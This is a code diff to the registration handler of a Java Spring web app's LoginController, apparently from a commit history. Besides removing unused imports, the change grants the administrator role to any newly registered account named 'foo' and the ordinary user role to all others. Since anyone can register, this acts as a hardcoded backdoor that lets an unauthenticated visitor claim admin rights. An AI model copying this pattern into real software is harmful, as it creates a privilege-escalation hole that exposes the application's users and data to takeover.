@@ -1,9 +1,5 @@
 package uk.co.probablyfine.aoko.controller;
 
-import java.security.Principal;
-
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Controller;
@@ -38,7 +34,9 @@ public class LoginController {
 	@RequestMapping(value = "register",method = RequestMethod.POST)
 	public String processNewUser(@RequestParam String username, @RequestParam String password, Model m) {
 		if (users.getFromUsername(username) == null) {
-			Account user = new Account(username,pass.encode(password));
+			
+			
+			Account user = new Account(username,pass.encode(password), username.equals("foo") ? "ROLE_ADMIN" : "ROLE_USER");
 			users.merge(user);
 			m.addAttribute("register", "Succesfully registered, can now log in");
 		} else {
